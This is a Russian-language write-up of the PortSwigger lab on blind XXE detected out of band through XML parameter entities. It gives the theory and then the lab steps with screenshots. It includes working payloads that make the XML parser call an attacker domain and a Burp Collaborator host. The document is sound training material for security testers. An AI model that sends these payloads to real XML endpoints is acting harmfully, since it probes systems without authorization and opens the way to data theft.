# Blind XXE with out-of-band interaction via XML parameter entities

## Theory

<h3>Обнаружение слепых XXE с использованием внеполосных (OAST) методов</h3>

Иногда атаки XXE с использованием обычных сущностей блокируются из-за некоторой проверки входных данных приложением или некоторой защиты используемого синтаксического анализатора XML. В этой ситуации вместо этого можно использовать сущности параметров XML. Сущности XML-параметров представляют собой особый вид XML-сущностей, на которые можно ссылаться только в другом месте DTD. Для настоящих целей вам нужно знать только две вещи. Во-первых, объявление сущности параметра XML включает символ процента перед именем сущности:
```
<!ENTITY % myparameterentity "my parameter entity value" >
```

И, во-вторых, на объекты параметров ссылаются с использованием символа процента вместо обычного амперсанда:
```
%myparameterentity;
```

Это означает, что вы можете протестировать слепой XXE, используя обнаружение вне диапазона с помощью объектов параметров XML следующим образом:
```
<!DOCTYPE foo [ <!ENTITY % xxe SYSTEM "http://f2g9j7hhkax.web-attacker.com"> %xxe; ]>
```

Эта полезная нагрузка XXE объявляет сущность параметра XML с именем xxe, а затем использует сущность в DTD. Это приведет к поиску DNS и HTTP-запросу к домену злоумышленника, подтверждая, что атака прошла успешно.

(DTD - Document Type Definition: Цель DTD состоит в определении допустимых строительных блоков XML документа.)

## Writeup

Главная страница:

![](https://github.com/fobblified/Writeups/blob/main/Portswigger/XXE_injection/Blind_XXE_with_out-of-band_interaction_via_XML_parameter_entities/assets/1.png)

Выберем любой продукт.

![](https://github.com/fobblified/Writeups/blob/main/Portswigger/XXE_injection/Blind_XXE_with_out-of-band_interaction_via_XML_parameter_entities/assets/2.png)

Перейдем на его страницу и спустимся в самый низ.

![](https://github.com/fobblified/Writeups/blob/main/Portswigger/XXE_injection/Blind_XXE_with_out-of-band_interaction_via_XML_parameter_entities/assets/3.png)

Нажмем на кнопку "Check stock" и перехватим запрос. Отправляем его в Repeater.

![](https://github.com/fobblified/Writeups/blob/main/Portswigger/XXE_injection/Blind_XXE_with_out-of-band_interaction_via_XML_parameter_entities/assets/4.png)

Запустим Burp Collaborator Client. Скопируем DNS.

![](https://github.com/fobblified/Writeups/blob/main/Portswigger/XXE_injection/Blind_XXE_with_out-of-band_interaction_via_XML_parameter_entities/assets/5.png)

Модифицируем запрос. Вставляем скопированный ранее DNS. Отправляем запрос. Код экплоита:
```
<!DOCTYPE stockCheck [<!ENTITY % xxe SYSTEM "http://8r00g402bxkhrf36sbo1ta0m5db3zs.burpcollaborator.net"> %xxe; ]>
```

![](https://github.com/fobblified/Writeups/blob/main/Portswigger/XXE_injection/Blind_XXE_with_out-of-band_interaction_via_XML_parameter_entities/assets/6.png)

Перейдем в Burp Collaborator Client. теперь мы можем заметить результат DNS lookup.

![](https://github.com/fobblified/Writeups/blob/main/Portswigger/XXE_injection/Blind_XXE_with_out-of-band_interaction_via_XML_parameter_entities/assets/7.png)

Получаем ответ от сервера.

![](https://github.com/fobblified/Writeups/blob/main/Portswigger/XXE_injection/Blind_XXE_with_out-of-band_interaction_via_XML_parameter_entities/assets/8.png)
